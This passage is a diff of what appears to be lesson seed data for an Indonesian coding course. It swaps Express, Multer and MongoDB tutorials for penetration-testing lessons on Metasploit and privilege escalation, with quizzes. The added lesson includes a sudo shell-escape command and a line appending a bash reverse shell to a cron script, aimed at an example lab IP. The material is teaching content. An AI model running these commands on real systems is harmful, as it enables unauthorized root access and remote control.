+> Metasploit sangat kuat, tapi ingat — banyak modulnya "noisy" dan mudah terdeteksi EDR. Untuk red team advanced, kombinasi dengan tools custom dan living-off-the-land sering lebih efektif.`,
     quiz: [
       {
-        question: "Bagaimana cara client mengirim JWT ke server?",
-        options: [
-          "Di body request",
-          "Di header Authorization: Bearer <token>",
-          "Di URL parameter",
-          "Di query string"
-        ],
+        question: "Apa itu Metasploit Framework?",
+        options: ["Antivirus", "Platform eksploitasi dengan ribuan exploit", "Firewall", "Web server"],
         answer: 1,
-        explanation: "JWT dikirim di header Authorization dengan format 'Bearer <token>'. Ini standar yang dikenal server."
+        explanation: "Metasploit Framework adalah platform eksploitasi open-source dengan ribuan exploit, payload, dan auxiliary module."
       },
       {
-        question: "Mengapa password harus di-hash dengan bcrypt sebelum disimpan?",
-        options: [
-          "Agar lebih cepat login",
-          "Agar password tidak terbaca jika database bocor",
-          "Untuk kompresi data",
-          "Tidak perlu di-hash"
-        ],
+        question: "Payload Metasploit yang paling canggih untuk Windows?",
+        options: ["bind_tcp", "meterpreter", "cmd/unix/reverse", "shell_find_tag"],
         answer: 1,
-        explanation: "Hashing bcrypt membuat password tidak bisa dibaca walau database bocor. bcrypt juga menambahkan salt untuk mencegah rainbow table attack."
+        explanation: "Meterpreter adalah payload Metasploit in-memory yang canggih dengan banyak fitur post-exploitation."
       },
       {
-        question: "Apa yang dilakukan middleware auth?",
-        options: [
-          "Membuat user baru",
-          "Verifikasi token dan simpan info user di req",
-          "Mengirim email",
-          "Hash password"
-        ],
+        question: "Perintah MSF untuk mencari exploit?",
+        options: ["find", "search", "lookup", "grep"],
         answer: 1,
-        explanation: "Middleware auth memverifikasi JWT, dan jika valid, menyimpan info user (decoded) di req.user agar handler bisa mengaksesnya."
+        explanation: "Perintah 'search' di msfconsole digunakan untuk mencari modul exploit/payload/auxiliary."
       }
     ]
   },
   {
     level: 5,
     order: 7,
-    title: "Upload File",
-    slug: "upload-file",
-    description: "Mengunggah file di Express menggunakan Multer: konfigurasi, storage, dan validasi.",
-    icon: "📤",
+    title: "Privilege Escalation",
+    slug: "privilege-escalation",
+    description: "Teknik meningkatkan akses dari user biasa ke root/admin.",
+    icon: "📈",
     isProject: false,
-    content: `# Upload File dengan Multer
+    content: `# Privilege Escalation
 
-**Multer** adalah middleware Express untuk menangani \`multipart/form-data\`—format yang digunakan saat upload file. Multer sangat populer untuk upload file di Node.js.
+**Privilege Escalation (priv esc)** adalah teknik untuk meningkatkan level akses dari user biasa menjadi root (Linux) atau Administrator/SYSTEM (Windows). Setelah mendapat shell awal, priv esc adalah langkah berikutnya untuk kontrol penuh.
 
-## Instalasi
+## Linux Priv Esc
 
 \`\`\`bash
-npm install multer
+# Enumerasi manual
+id
+uname -a
+sudo -l
+cat /etc/crontab
+find / -perm -4000 -type f 2>/dev/null   # SUID binaries
+
+# Automated tools
+./LinPEAS.sh
+./linpeas.sh -a
+linux-exploit-suggester.sh
 \`\`\`
 
-## Setup Dasar
+### Skenario umum
 
-\`\`\`javascript
-const express = require("express");
-const multer = require("multer");
-const app = express();
+\`\`\`bash
+# Sudo misconfiguration
+sudo /bin/find . -exec /bin/sh \\; -quit
 
-// Konfigurasi storage
-const storage = multer.diskStorage({
-  destination: (req, file, cb) => {
-    cb(null, "uploads/"); // folder tujuan
-  },
-  filename: (req, file, cb) => {
-    const unique = Date.now() + "-" + Math.round(Math.random() * 1E9);
-    cb(null, file.fieldname + "-" + unique + "." + file.mimetype.split("/")[1]);
-  }
-});
+# SUID binary (mis. /usr/bin/passwd versi lama)
+find / -perm -u=s -type f 2>/dev/null
 
-// Filter file (hanya gambar)
-const fileFilter = (req, file, cb) => {
-  if (file.mimetype.startsWith("image/")) {
-    cb(null, true);
-  } else {
-    cb(new Error("Hanya file gambar yang diizinkan!"), false);
-  }
-};
+# Cron job dengan script writable
+echo '/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/backup.sh
 
-const upload = multer({ 
-  storage: storage,
-  fileFilter: fileFilter,
-  limits: { fileSize: 5 * 1024 * 1024 } // max 5MB
-});
+# Kernel exploit
+uname -r   # cari CVE sesuai versi kernel
 \`\`\`
 
-## Route Upload Single File
+## Windows Priv Esc
 
-\`\`\`javascript
-// Upload 1 file dengan field name "avatar"
-app.post("/upload", upload.single("avatar"), (req, res) => {
-  if (!req.file) return res.status(400).json({ error: "File wajib diupload" });
-  
-  res.json({
-    message: "File berhasil diupload",
-    file: {
-      originalname: req.file.originalname,
-      filename: req.file.filename,
-      size: req.file.size,
-      path: req.file.path
-    }
-  });
-});
+\`\`\`powershell
+# Tools otomatis
+.\\WinPEAS.bat
+.\\PowerUp.ps1
+Invoke-PrivescAudit
+
+# Manual
+whoami /priv
+systeminfo | findstr /B /C:"OS"
+net user administrator
+
+# Cek service dengan path unquoted
+wmic service get name,displayname,pathname,startmode |findstr/i "Auto" |findstr/i /v "C:\\Windows"
 \`\`\`
 
-## Upload Multiple Files
+## Vektor Populer
 
-\`\`\`javascript
-// Upload maksimal 5 file
-app.post("/upload-multiple", upload.array("photos", 5), (req, res) => {
-  const files = req.files.map(f => ({
-    filename: f.filename,
-    size: f.size
-  }));
-  res.json({ message: "Upload berhasil", files });
-});
+\`\`\`text
+Linux:
+- Kernel exploit (Dirty COW, Dirty Pipe)
+- Sudo / SUID misconfig
+- Cron job writable
+- PATH hijacking
+- Capability abuse (cap_setuid)
 
-// Upload multiple field berbeda
-app.post("/profile", upload.fields([
-  { name: "avatar", maxCount: 1 },
-  { name: "gallery", maxCount: 8 }
-]), (req, res) => {
-  res.json({ 
-    avatar: req.files.avatar,
-    gallery: req.files.gallery
-  });
-});
+Windows:
+- Unquoted service path
+- DLL hijacking
+- Stored credentials
+- Token impersonation (JuicyPotato)
+- AlwaysInstallElevated MSI
 \`\`\`
 
-## Memory Storage (untuk upload ke cloud)
-
-\`\`\`javascript
-const upload = multer({ storage: multer.memoryStorage() });
-// File disimpan di req.file.buffer (sebelum upload ke S3/Cloudinary)
-\`\`\`
-
-## Error Handling
-
-\`\`\`javascript
-app.use((err, req, res, next) => {
-  if (err instanceof multer.MulterError) {
-    if (err.code === "LIMIT_FILE_SIZE") {
-      return res.status(400).json({ error: "File terlalu besar (max 5MB)" });
-    }
-    return res.status(400).json({ error: err.message });
-  }
-  if (err) return res.status(400).json({ error: err.message });
-  next();
-});
-\`\`\`
-
-## Serve Static Files
-
-\`\`\`javascript
-// Agar file di folder uploads bisa diakses
-app.use("/uploads", express.static("uploads"));
-\`\`\`
-
-> **Best Practice:** Selalu validasi tipe file dan ukuran. Untuk produksi, upload ke cloud storage (S3, Cloudinary) bukan lokal.`,
+> Priv esc bukan tentang satu trik ajaib, tapi tentang enumerasi menyeluruh. LinPEAS dan WinPEAS menghemat waktu, tapi pahami outputnya — bukan asal copy paste.`,
     quiz: [
       {
-        question: "Middleware apa yang digunakan untuk upload file di Express?",
-        options: ["body-parser", "multer", "cors", "morgan"],
+        question: "Apa tujuan privilege escalation?",
+        options: ["Menghapus user", "Menaikkan level akses ke root/admin", "Backup data", "Enkripsi disk"],
         answer: 1,
-        explanation: "Multer adalah middleware Express khusus untuk menangani multipart/form-data yang digunakan saat upload file."
+        explanation: "Privilege escalation bertujuan meningkatkan level akses dari user biasa menjadi root (Linux) atau admin (Windows)."
       },
       {
-        question: "Method multer manakah untuk upload 1 file?",
-        options: ["upload.array()", "upload.single()", "upload.fields()", "upload.many()"],
+        question: "Tool automasi priv esc untuk Linux?",
+        options: ["WinPEAS", "LinPEAS", "Metasploit", "Burp Suite"],
         answer: 1,
-        explanation: "upload.single('fieldname') untuk upload 1 file. upload.array() untuk multiple files dengan nama field sama, upload.fields() untuk multiple field berbeda."
+        explanation: "LinPEAS adalah script enumerasi otomatis yang populer untuk Linux privilege escalation."
       },
       {
-        question: "Apa tujuan fileFilter di Multer?",
-        options: [
-          "Membatasi ukuran file",
-          "Memfilter berdasarkan tipe file (mimetype)",
-          "Mengkompres file",
-          "Mengubah nama file"
-        ],
-        answer: 1,
-        explanation: "fileFilter memungkinkan kita menolak file berdasarkan mimetype atau kriteria lain. limits.fileSize untuk batas ukuran."
+        question: "Cek hak sudo user di Linux?",
+        options: ["sudo -l", "whoami -a", "ls -la", "cat /etc/passwd"],
+        answer: 0,
+        explanation: "Perintah 'sudo -l' menampilkan perintah yang dapat dijalankan user dengan sudo tanpa password."
       }
     ]
   },
   {
     level: 5,
     order: 8,
-    title: "Project: API Sederhana",
-    slug: "project-api-sederhana",
-    description: "Bangun REST API lengkap untuk manajemen produk dengan Express, JWT auth, dan validasi.",
-    icon: "🛠️",
-    isProject: true,
-    content: `# Project: API Sederhana
-
-Pada project ini, kamu akan membangun **REST API lengkap** untuk manajemen produk dengan authentication, validasi, dan dokumentasi. API ini menggabungkan semua konsep Level 5.
-
-## Fitur API
-
-- **Auth**: register, login (JWT)
-- **CRUD Produk**: create, read, update, delete
-- **Search & filter** produk
-- **Pagination** hasil query
-- **Validasi input** dengan middleware
-- **Upload gambar** produk
-- **Protected routes** (butuh token)
-- **Error handling** terpusat
-- **Logging** request
-
-## Tech Stack
-
-- **Express.js** - web framework
-- **JWT** - authentication
-- **bcrypt** - hash password
-- **multer** - upload file
-- **joi/express-validator** - validasi
-- **morgan** - logging
-- **cors** - cross-origin
-
-## Struktur Project
-
-\`\`\`
-api-produk/
-├── src/
-│   ├── config/
-│   │   └── db.js
-│   ├── middleware/
-│   │   ├── auth.js
-│   │   ├── validate.js
-│   │   └── errorHandler.js
-│   ├── routes/
-│   │   ├── auth.js
-│   │   └── products.js
-│   ├── controllers/
-│   │   ├── authController.js
-│   │   └── productController.js
-│   ├── models/
-│   │   ├── User.js
-│   │   └── Product.js
-│   └── app.js
-├── uploads/
-├── .env
-└── package.json
-\`\`\`
-
-## Kode Utama: app.js
-
-\`\`\`javascript
-const express = require("express");
-const morgan = require("morgan");
-const cors = require("cors");
-require("dotenv").config();
-
-const authRoutes = require("./routes/auth");
-const productRoutes = require("./routes/products");
-const errorHandler = require("./middleware/errorHandler");
-
-const app = express();
-
-app.use(cors());
-app.use(express.json());
-app.use(morgan("dev"));
-app.use("/uploads", express.static("uploads"));
-
-app.use("/api/auth", authRoutes);
-app.use("/api/products", productRoutes);
-
-// Error handler (paling bawah)
-app.use(errorHandler);
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(\`Server di port \${PORT}\`));
-\`\`\`
-
-## Contoh Route dengan Auth + Upload
-
-\`\`\`javascript
-// routes/products.js
-const router = require("express").Router();
-const auth = require("../middleware/auth");
-const upload = require("../config/multer");
-const { 
-  getProducts, 
-  createProduct, 
-  updateProduct, 
-  deleteProduct 
-} = require("../controllers/productController");
-
-router.get("/", getProducts);
-router.get("/:id", getProductById);
-router.post("/", auth, upload.single("image"), createProduct);
-router.put("/:id", auth, updateProduct);
-router.delete("/:id", auth, deleteProduct);
-
-module.exports = router;
-\`\`\`
-
-## Langkah Implementasi
-
-1. **Setup project**: \`npm init\`, install dependencies
-2. **Buat struktur folder** sesuai diagram
-3. **Buat User model** dengan hash password
-4. **Implementasi auth routes**: register & login
-5. **Buat JWT middleware** untuk protected routes
-6. **Buat Product model** (simpan ke array/file dulu, nanti MongoDB)
-7. **Implementasi CRUD products** (hanya yang login bisa create/update/delete)
-8. **Tambah upload gambar** dengan Multer
-9. **Validasi input** (nama wajib, harga > 0)
-10. **Implementasi search & pagination**: \`/products?search=laptop&page=1&limit=10\`
-11. **Error handling middleware** terpusat
-12. **Test semua endpoint** dengan Postman/Thunder Client
-13. **Dokumentasi** dengan Postman Collection atau README
-
-## Tantangan Tambahan
-
-- **Role-based access** (admin bisa hapus, user biasa tidak)
-- **Rate limiting** untuk hindari spam
-- **Soft delete** (tambah field \`deletedAt\`)
-- **Caching** dengan Redis
-- **Dokumentasi Swagger/OpenAPI**`,
-    quiz: [
-      {
-        question: "Mengapa kita memisahkan routes, controllers, dan models ke folder berbeda?",
-        options: [
-          "Agar lebih cepat",
-          "Untuk separation of concerns dan maintainability",
-          "Karena Express mewajibkan",
-          "Tidak perlu dipisah"
-        ],
-        answer: 1,
-        explanation: "Pemisahan folder mengikuti prinsip separation of concerns—kode lebih terorganisir, mudah di-maintain, dan testable."
-      },
-      {
-        question: "Pada project ini, route mana yang seharusnya butuh auth middleware?",
-        options: [
-          "GET /api/products (lihat semua)",
-          "POST /api/products (tambah produk)",
-          "GET /api/products/:id",
-          "Tidak perlu auth"
-        ],
-        answer: 1,
-        explanation: "Operasi create/update/delete biasanya butuh auth (hanya user login). GET (read) seringkali publik. Tapi bisa sesuai kebutuhan aplikasi."
-      },
-      {
-        question: "Apa guna middleware error handler di Express?",
-        options: [
-          "Mencegah semua error",
-          "Menangkap error terpusat dan kirim response konsisten",
-          "Mempercepat server",
-          "Menyimpan error ke database"
-        ],
-        answer: 1,
-        explanation: "Error handler middleware (dengan 4 parameter: err, req, res, next) menangkap semua error di route dan kirim response error yang konsisten ke client."
-      }
-    ]
-  },
-
-  // ==================== LEVEL 6 - DATABASE ====================
-  {
-    level: 6,
-    order: 1,
-    title: "Pengenalan Database",
-    slug: "pengenalan-database",
-    description: "Mengenal konsep database, perbedaan SQL dan NoSQL, serta kapan menggunakan keduanya.",
-    icon: "🗄️",
-    isProject: false,
-    content: `# Pengenalan Database
-
-**Database** adalah sistem penyimpanan data terorganisir yang memungkinkan aplikasi menyimpan, mengambil, dan mengelola data secara efisien. Tanpa database, data hilang saat aplikasi dimatikan.
-
-## Mengapa Butuh Database?
-
-- **Persistensi**: data tetap ada walau server mati
-- **Skalabilitas**: handle jutaan data
-- **Konsistensi**: data terstruktur & valid
-- **Concurrency**: banyak user akses bersamaan
-- **Query**: cari data cepat dengan query
-
-## Jenis Database
-
-### 1. Relational (SQL)
-
-Data disimpan dalam **tabel** dengan baris dan kolom. Menggunakan bahasa **SQL**.
-
-Contoh: MySQL, PostgreSQL, SQLite, SQL Server
-
-\`\`\`sql
-CREATE TABLE users (
-  id INT PRIMARY KEY,
-  nama VARCHAR(100),
-  email VARCHAR(100) UNIQUE
-);
-
-SELECT * FROM users WHERE nama = 'Budi';
-\`\`\`
-
-### 2. NoSQL (Non-Relational)
-
-Data disimpan sebagai **document**, key-value, graph, atau column-family. Fleksibel tanpa schema tetap.
-
-Contoh: MongoDB, Redis, Cassandra, Neo4j
-
-\`\`\`javascript
-// MongoDB document
-{
-  _id: ObjectId("..."),
-  nama: "Budi",
-  email: "budi@mail.com",
-  hobi: ["coding", "gaming"],
-  alamat: { kota: "Jakarta", kodePos: "12345" }
-}
-\`\`\`
-
-## Perbandingan SQL vs NoSQL
-
-| Aspek | SQL | NoSQL |
-|-------|-----|-------|
-| Struktur | Tabel tetap (schema) | Fleksibel (schema-less) |
-| Query | SQL standar | Bervariasi |
-| Skalabilitas | Vertikal (naikkan server) | Horizontal (tambah server) |
-| Relasi | Strong (JOIN) | Lemah/Embed |
-| ACID | Ya | Tergantung |
-| Cocok untuk | Data terstruktur, transaksi | Data fleksibel, big data |
-
-## Kapan Pakai SQL?
-
-- Sistem keuangan, banking (butuh ACID)
-- Data terstruktur dan relasi kompleks
-- Aplikasi ERP, inventory
-- Butuh JOIN antar banyak tabel
-
-## Kapan Pakai NoSQL?
-
-- Aplikasi real-time, social media
-- Data tidak terstruktur/berubah-ubah
-- Butuh skalabilitas horizontal
-- Big data, content management
-
-## ACID Properties
-
-- **Atomicity**: semua operasi berhasil atau gagal total
-- **Consistency**: data tetap valid setelah transaksi
-- **Isolation**: transaksi concurrent tidak saling ganggu
-- **Durability**: data tersimpan permanen setelah commit
-
-> **Best Practice:** Tidak ada database "terbaik" untuk semua kasus. Pilih sesuai kebutuhan: SQL untuk data terstruktur & transaksional, NoSQL untuk fleksibilitas dan skalabilitas.`,
-    quiz: [
-      {
-        question: "Apa perbedaan utama SQL dan NoSQL?",
-        options: [
-          "SQL lebih cepat",
-          "SQL pakai tabel terstruktur, NoSQL fleksibel (document)",
-          "NoSQL hanya untuk angka",
-          "SQL tidak bisa simpan data permanen"
-        ],
-        answer: 1,
-        explanation: "SQL (relational) menyimpan data dalam tabel tetap dengan schema. NoSQL menyimpan data fleksibel (document, key-value) tanpa schema ketat."
-      },
-      {
-        question: "Manakah yang termasuk database relational (SQL)?",
-        options: ["MongoDB", "Redis", "PostgreSQL", "Cassandra"],
-        answer: 2,
-        explanation: "PostgreSQL adalah database relational (SQL). MongoDB, Redis, Cassandra adalah NoSQL."
-      },
-      {
-        question: "Kapan lebih baik menggunakan NoSQL?",
-        options: [
-          "Sistem banking yang butuh ACID",
-          "Data terstruktur dengan banyak relasi",
-          "Data fleksibel, big data, perlu skalabilitas horizontal",
-          "Aplikasi dengan sedikit data"
-        ],
-        answer: 2,
-        explanation: "NoSQL cocok untuk data fleksibel, big data, dan aplikasi yang butuh skalabilitas horizontal. SQL untuk banking dan data terstruktur dengan relasi."
-      }
-    ]
-  },
-  {
-    level: 6,
-    order: 2,
-    title: "MongoDB",
-    slug: "mongodb",
-    description: "Mengenal MongoDB: database NoSQL document-oriented, collections, documents, dan instalasi.",
-    icon: "🍃",
-    isProject: false,
-    content: `# MongoDB
-
-**MongoDB** adalah database **NoSQL document-oriented** paling populer. Data disimpan sebagai **document** BSON (biner JSON) dalam **collection**. MongoDB fleksibel, skalabel, dan mudah dipelajari untuk developer JavaScript.
-
-## Konsep Dasar
-
-| Relational | MongoDB |
-|-----------|---------|
-| Database | Database |
-| Table | Collection |
-| Row | Document |
-| Column | Field |
-| Index | Index |
-| JOIN | Embed / \$lookup |
-
-## Struktur Document
-
-\`\`\`javascript
-// 1 document = 1 record
-{
-  _id: ObjectId("6123abc..."),
-  nama: "Budi Santoso",
-  email: "budi@mail.com",
-  umur: 25,
-  aktif: true,
-  hobi: ["coding", "gaming"],
-  alamat: {
-    kota: "Jakarta",
-    kodePos: "12345"
-  },
-  createdAt: ISODate("2024-01-01T00:00:00Z")
-}
-\`\`\`
-
-## Instalasi
-
-### Opsi 1: Local Install
-\`\`\`bash
-# Ubuntu
-sudo apt install mongodb
-
-# macOS
-brew tap mongodb/brew
-brew install mongodb-community
-
-# Windows: download installer dari mongodb.com
-\`\`\`
-
-### Opsi 2: MongoDB Atlas (Cloud - GRATIS)
-1. Daftar di mongodb.com/atlas
-2. Buat cluster free
-3. Dapatkan connection string
-4. Connect dengan MongoDB Compass (GUI)
-
-### Opsi 3: Docker
-\`\`\`bash
-docker run -d -p 27017:27017 --name mongo mongo
-\`\`\`
-
-## Koneksi via MongoDB Shell
-
-\`\`\`bash
-# Connect ke local
-mongosh "mongodb://localhost:27017"
-
-# Connect ke Atlas
-mongosh "mongodb+srv://user:pass@cluster.mongodb.net/dbname"
-\`\`\`
-
-## Operasi Dasar di Shell
-
-\`\`\`javascript
-// Pilih database
-use tokoOnline;
-
-// Insert 1 document
-db.users.insertOne({ nama: "Budi", umur: 25 });
-
-// Insert banyak
-db.users.insertMany([
-  { nama: "Andi", umur: 30 },
-  { nama: "Citra", umur: 28 }
-]);
-
-// Find semua
-db.users.find();
-
-// Find dengan filter
-db.users.find({ umur: { $gte: 28 } });
-
-// Update
-db.users.updateOne({ nama: "Budi" }, { $set: { umur: 26 } });
-
-// Delete
-db.users.deleteOne({ nama: "Andi" });
-\`\`\`
-
-## Operator Query Umum
-
-\`\`\`javascript
-$eq   // sama dengan
-$ne   // tidak sama
-$gt   // lebih besar
-$gte  // lebih besar atau sama
-$lt   // lebih kecil
-$in   // ada di array
-$nin  // tidak ada di array
-$and  // logika AND
-$or   // logika OR
-\`\`\`
-
-## MongoDB Compass (GUI)
-
-MongoDB Compass adalah tool visual untuk melihat dan mengelola database MongoDB. Lebih mudah bagi pemula daripada shell.
-
-> **Best Practice:** Mulai dengan **MongoDB Atlas** (free) untuk belajar tanpa instalasi. Gunakan Compass untuk eksplorasi data secara visual.`,
-    quiz: [
-      {
-        question: "Di MongoDB, apa yang setara dengan 'table' di database relational?",
-        options: ["Document", "Collection", "Field", "Database"],
-        answer: 1,
-        explanation: "Collection di MongoDB setara dengan table di relational DB. Document setara dengan row, field setara dengan column."
-      },
-      {
-        question: "Format apa yang digunakan MongoDB untuk menyimpan data?",
-        options: ["XML", "BSON (biner JSON)", "CSV", "YAML"],
-        answer: 1,
-        explanation: "MongoDB menyimpan data dalam format BSON (Binary JSON)—versi biner dari JSON yang mendukung tipe data tambahan seperti ObjectId, Date, dll."
-      },
-      {
-        question: "Operator manakah untuk mencari nilai yang lebih besar atau sama dengan?",
-        options: ["$gt", "$gte", "$eq", "$in"],
-        answer: 1,
-        explanation: "$gte (greater than or equal) untuk lebih besar atau sama. $gt hanya lebih besar, $eq sama dengan, $in untuk cek keberadaan dalam array."
-      }
-    ]
-  },
-  {
-    level: 6,
-    order: 3,
-    title: "CRUD",
-    slug: "crud",
-    description: "Operasi CRUD di MongoDB: Create (insert), Read (find), Update, dan Delete document.",
-    icon: "🔄",
-    isProject: false,
-    content: `# Operasi CRUD di MongoDB
-
-**CRUD** adalah empat operasi dasar database: **C**reate, **R**ead, **U**pdate, **D**elete. Memahami CRUD adalah fondasi wajib untuk bekerja dengan database.
-
-## 1. CREATE (Insert)
-
-\`\`\`javascript
-// Insert satu document
-db.users.insertOne({
-  nama: "Budi",
-  email: "budi@mail.com",
-  umur: 25
-});
-
-// Insert banyak document sekaligus
-db.users.insertMany([
-  { nama: "Andi", umur: 30 },
-  { nama: "Citra", umur: 28 },
-  { nama: "Dina", umur: 22 }
-]);
-\`\`\`
-
-## 2. READ (Find)
-
-\`\`\`javascript
-// Ambil semua document
-db.users.find();
-
-// Filter sederhana (exact match)
-db.users.find({ nama: "Budi" });
-
-// Filter dengan operator
-db.users.find({ umur: { $gte: 25 } });  // umur >= 25
-db.users.find({ umur: { $gt: 22, $lt: 30 } }); // 22 < umur < 30
-db.users.find({ nama: { $in: ["Budi", "Andi"] } }); // nama salah satu
-
-// Logika AND / OR
-db.users.find({ 
-  $or: [
-    { umur: { $lt: 25 } },
-    { nama: "Budi" }
-  ]
-});
-
-// Projection (pilih field tertentu)
-db.users.find({}, { nama: 1, umur: 1, _id: 0 });
-
-// Limit, Skip, Sort (pagination)
-db.users.find().limit(10).skip(0).sort({ umur: -1 }); // descending
-\`\`\`
-
-## 3. UPDATE
-
-\`\`\`javascript
-// Update satu document (yang pertama cocok)
-db.users.updateOne(
-  { nama: "Budi" },          // filter
-  { $set: { umur: 26 } }     // update
-);
-
-// Update banyak document
-db.users.updateMany(
-  { umur: { $lt: 25 } },
-  { $set: { status: "muda" } }
-);
-
-// Operator update
-$set    // set field
-$unset  // hapus field
-$inc    // increment angka
-$push   // tambah ke array
-$pull   // hapus dari array
-$rename // rename field
-
-// Contoh
-db.users.updateOne(
-  { nama: "Budi" },
-  { 
-    $set: { umur: 26 },
-    $push: { hobi: "membaca" },
-    $inc: { loginCount: 1 }
-  }
-);
-
-// Replace seluruh document
-db.users.replaceOne({ nama: "Budi" }, { nama: "Budi", umur: 26 });
-\`\`\`
-
-## 4. DELETE
-
-\`\`\`javascript
-// Hapus satu document
-db.users.deleteOne({ nama: "Budi" });
-
-// Hapus banyak document
-db.users.deleteMany({ umur: { $lt: 25 } });
-
-// Hapus SEMUA document (hati-hati!)
-db.users.deleteMany({});
-\`\`\`
-
-## findOne() vs find()
-
-\`\`\`javascript
-const satu = db.users.findOne({ nama: "Budi" }); // 1 object
-const banyak = db.users.find({ umur: 25 });      // cursor/array
-\`\`\`
-
-> **Best Practice:** Selalu sertakan filter saat delete. \`deleteMany({})\` akan menghapus SEMUA data. Gunakan dengan sangat hati-hati!`,
-    quiz: [
-      {
-        question: "Method manakah untuk insert banyak document sekaligus?",
-        options: ["insertOne", "insertMany", "insertAll", "addMany"],
-        answer: 1,
-        explanation: "insertMany menerima array document dan menyimpannya sekaligus. insertOne hanya untuk 1 document."
-      },
-      {
-        question: "Apa fungsi operator $inc di update?",
-        options: [
-          "Increment nilai angka",
-          "Insert document",
-          "Hapus field",
-          "Rename field"
-        ],
-        answer: 0,
-        explanation: "$inc menambah nilai field angka dengan jumlah tertentu. Misal { $inc: { loginCount: 1 } } menambah loginCount sebanyak 1."
-      },
-      {
-        question: "Apa yang terjadi jika menjalankan db.users.deleteMany({})?",
-        options: [
-          "Error karena filter kosong",
-          "Hapus SEMUA document di collection users",
-          "Tidak menghapus apa-apa",
-          "Hapus 1 document saja"
-        ],
-        answer: 1,
-        explanation: "deleteMany({}) dengan filter kosong akan menghapus SEMUA document di collection. Sangat berbahaya, gunakan dengan hati-hati!"
-      }
-    ]
-  },
-  {
-    level: 6,
-    order: 4,
-    title: "Relasi Data",
-    slug: "relasi-data",
-    description: "Memahami relasi data di MongoDB: embedding, referencing, dan population.",
-    icon: "🔗",
-    isProject: false,
-    content: `# Relasi Data di MongoDB
-
-Berbeda dengan SQL yang menggunakan **JOIN**, MongoDB memiliki dua cara merepresentasikan relasi: **Embedding** (selipkan data) dan **Referencing** (simpan referensi ID).
-
-## 1. Embedding (Document Tertanam)
-
-Data terkait disimpan di dalam document utama. Cocok untuk data "one-to-few" yang sering diakses bersama.
-
-\`\`\`javascript
-// User dengan alamat tertanam
-{
-  _id: ObjectId("..."),
-  nama: "Budi",
-  alamat: {
-    kota: "Jakarta",
-    kodePos: "12345",
-    jalan: "Jl. Merdeka No. 1"
-  }
-}
-
-// Post dengan comments tertanam
-{
-  _id: ObjectId("..."),
-  judul: "Belajar MongoDB",
-  komentar: [
-    { nama: "Andi", teks: "Mantap!" },
-    { nama: "Citra", teks: "Bagus" }
-  ]
-}
-\`\`\`
-
-**Kelebihan**: 1 query dapatkan semua data, performa baca cepat
-**Kekurangan**: document bisa membesar, duplikasi data
-
-## 2. Referencing (Storing ID)
-
-Simpan ID document lain sebagai referensi. Cocok untuk "one-to-many" atau "many-to-many".
-
-\`\`\`javascript
-// User
-{ _id: ObjectId("user1"), nama: "Budi" }
-
-// Posts yang reference ke user
-{ _id: ObjectId("post1"), judul: "Post 1", author: ObjectId("user1") }
-{ _id: ObjectId("post2"), judul: "Post 2", author: ObjectId("user1") }
-\`\`\`
-
-## $lookup (Join di MongoDB)
-
-\`\`\`javascript
-db.posts.aggregate([
-  {
-    $lookup: {
-      from: "users",
-      localField: "author",
-      foreignField: "_id",
-      as: "authorData"
-    }
-  }
-]);
-// Hasil: post dengan data author disisipkan
-\`\`\`
-
-## One-to-One
-
-\`\`\`javascript
-// User dan Profile (1:1)
-// Reference: simpan profileId di user
-{ _id: ObjectId("u1"), nama: "Budi", profile: ObjectId("p1") }
-{ _id: ObjectId("p1"), bio: "Developer", umur: 25 }
-\`\`\`
-
-## One-to-Many
-
-\`\`\`javascript
-// User dan Posts (1:many)
-// Reference di sisi "many": post menyimpan userId
-{ _id: ObjectId("p1"), judul: "Post 1", userId: ObjectId("u1") }
-{ _id: ObjectId("p2"), judul: "Post 2", userId: ObjectId("u1") }
-
-// Atau embed array of IDs di sisi "one"
-{ _id: ObjectId("u1"), nama: "Budi", posts: [ObjectId("p1"), ObjectId("p2")] }
-\`\`\`
-
-## Many-to-Many
-
-\`\`\`javascript
-// Student dan Course (many:many)
-// Buat collection junction
-{ _id: ObjectId("..."), studentId: ObjectId("s1"), courseId: ObjectId("c1") }
-\`\`\`
-
-## Kapan Embed vs Reference?
-
-| Kondisi | Pilih |
-|---------|-------|
-| Data sedikit & sering diakses bersama | Embed |
-| Data banyak & tumbuh terus | Reference |
-| Data berubah jarang | Embed |
-| Data berubah sering & di banyak tempat | Reference |
-| Butuh query terpisah | Reference |
-
-> **Best Practice:** Embed untuk data "one-to-few" yang selalu diakses bersama. Reference untuk data besar atau yang berubah sering. Hindari document yang tumbuh tanpa batas (max 16MB).`,
-    quiz: [
-      {
-        question: "Kapan lebih baik menggunakan embedding daripada referencing?",
-        options: [
-          "Data banyak dan tumbuh terus",
-          "Data sedikit dan sering diakses bersama",
-          "Data berubah sering di banyak tempat",
-          "Selalu gunakan embedding"
-        ],
-        answer: 1,
-        explanation: "Embedding cocok untuk data sedikit (one-to-few) yang sering diakses bersamaan, karena 1 query dapat semua data."
-      },
-      {
-        question: "Apa operator MongoDB untuk melakukan JOIN?",
-        options: ["$join", "$lookup", "$merge", "$connect"],
-        answer: 1,
-        explanation: "$lookup dalam aggregation pipeline digunakan untuk JOIN collection di MongoDB, mirip JOIN di SQL."
-      },
-      {
-        question: "Bagaimana cara merepresentasikan relasi one-to-many di MongoDB?",
-        options: [
-          "Hanya dengan embed",
-          "Reference ID di sisi 'many' atau array ID di sisi 'one'",
-          "Tidak bisa di MongoDB",
-          "Harus buat collection baru wajib"
-        ],
-        answer: 1,
-        explanation: "One-to-many bisa dengan reference: simpan parentId di child, atau simpan array child IDs di parent. Pilih sesuai pola akses data."
-      }
-    ]
-  },
-  {
-    level: 6,
-    order: 5,
-    title: "Mongoose",
-    slug: "mongoose",
-    description: "Menggunakan Mongoose ODM untuk MongoDB: schema, model, validation, dan middleware.",
-    icon: "🦫",
-    isProject: false,
-    content: `# Mongoose ODM
-
-**Mongoose** adalah **ODM (Object Data Modeling)** untuk MongoDB dan Node.js. Mongoose memberikan **schema-based** solution, validasi, type casting, dan middleware—membuat MongoDB lebih terstruktur.
-
-## Instalasi dan Koneksi
-
-\`\`\`bash
-npm install mongoose
-\`\`\`
-
-\`\`\`javascript
-const mongoose = require("mongoose");
-
-mongoose.connect("mongodb://localhost:27017/toko", {
-  useNewUrlParser: true,
-  useUnifiedTopology: true
-})
-.then(() => console.log("Terhubung ke MongoDB"))
-.catch(err => console.error("Error:", err));
-\`\`\`
-
-## Definisi Schema dan Model
-
-\`\`\`javascript
-const userSchema = new mongoose.Schema({
-  nama: {
-    type: String,
-    required: true,
